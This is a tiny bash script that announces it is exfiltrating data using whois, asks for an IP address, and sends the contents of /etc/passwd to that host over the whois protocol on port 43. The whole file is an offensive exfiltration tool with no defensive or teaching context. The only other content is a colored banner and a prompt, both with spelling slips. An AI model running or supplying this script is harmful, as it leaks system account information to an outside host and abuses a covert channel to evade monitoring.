#!/bin/bash

echo -e "\e[92mExfiltating data using whois!"

printf "Enter the IP Addres: "
read IP

whois -h $IP -p 43 `cat /etc/passwd`
